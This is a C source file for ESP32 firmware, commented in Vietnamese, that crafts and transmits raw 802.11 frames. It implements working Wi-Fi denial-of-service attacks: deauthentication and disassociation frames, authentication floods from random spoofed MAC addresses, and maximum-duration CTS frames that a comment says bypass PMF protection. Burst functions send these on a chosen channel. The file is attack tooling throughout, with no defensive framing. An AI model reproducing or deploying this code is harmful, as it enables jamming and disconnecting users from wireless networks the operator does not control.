#include "frames.h"
#include <string.h>
#include <stdlib.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

const uint8_t MAC_BROADCAST[MAC_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
#define FRAMES_PER_BURST 10

// 1. Cấu trúc CTS chuẩn 10 byte (Gói khóa sóng không khí)
typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t ra[6];
} cts_frame_t;

// 2. Định nghĩa cấu trúc mảng byte chuẩn theo file gốc
typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} mgmt_reasoned_frame_t;  

typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t auth_alg[2];
    uint8_t auth_seq[2];
    uint8_t status[2];
} auth_frame_t;

static uint16_t s_seq = 0;
static inline uint16_t next_seq(void) {
    s_seq = (s_seq + 1) & 0x0FFF;
    return s_seq;
}

// Hàm sinh gói tin CTS khóa sóng không khí (Bypass PMF)
static void send_cts_frame(const uint8_t *bssid) {
    cts_frame_t f;
    f.frame_ctrl[0] = 0x84; // Type: Control, Subtype: CTS
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0xFF; // Ép thời gian chờ im lặng tối đa
    f.duration[1]   = 0x7F; 
    memcpy(f.ra, bssid, 6); 
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

static void send_reasoned(uint8_t subtype, const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    mgmt_reasoned_frame_t f;
    f.frame_ctrl[0] = subtype;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da, da, 6);
    memcpy(f.sa, bssid, 6);
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;
    f.reason[0] = reason & 0xFF;
    f.reason[1] = (reason >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

void frames_send_deauth(const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    send_reasoned(0xC0, da, bssid, reason);
}

void frames_send_disassoc(const uint8_t *da, const uint8_t *bssid, uint16_t reason) {
    send_reasoned(0xA0, da, bssid, reason);
}

void frames_send_auth_flood(const uint8_t *bssid) {
    auth_frame_t f;
    f.frame_ctrl[0] = 0xB0;
    f.frame_ctrl[1] = 0x00;
    f.duration[0]   = 0x00;
    f.duration[1]   = 0x00;
    memcpy(f.da, bssid, 6);
    for (int i = 0; i < 6; i++) {
        f.sa[i] = (uint8_t)(esp_random() & 0xFF);
    }
    f.sa[0] = (f.sa[0] & 0xFC) | 0x02;
    memcpy(f.bssid, bssid, 6);
    uint16_t seq = next_seq() << 4;
    f.seq[0] = seq & 0xFF;
    f.seq[1] = (seq >> 8) & 0xFF;
    f.auth_alg[0] = 0x00;  
    f.auth_alg[1] = 0x00;
    f.auth_seq[0] = 0x01;  
    f.auth_seq[1] = 0x00;
    f.status[0]   = 0x00;
    f.status[1]   = 0x00;
    esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
}

uint32_t frames_burst_deauth(uint8_t channel, const uint8_t *da, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        send_cts_frame(bssid); 
        vTaskDelay(2 / portTICK_PERIOD_MS); // Khoảng nghỉ giải phóng CPU, chống Bootloop
    }
    return FRAMES_PER_BURST;
}

uint32_t frames_burst_disassoc(uint8_t channel, const uint8_t *da, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        send_cts_frame(bssid); 
        vTaskDelay(2 / portTICK_PERIOD_MS); 
    }
    return FRAMES_PER_BURST;
}

uint32_t frames_burst_auth_flood(uint8_t channel, const uint8_t *bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < FRAMES_PER_BURST; i++) {
        frames_send_auth_flood(bssid);
        vTaskDelay(2 / portTICK_PERIOD_MS); 
    }
    return FRAMES_PER_BURST;
}
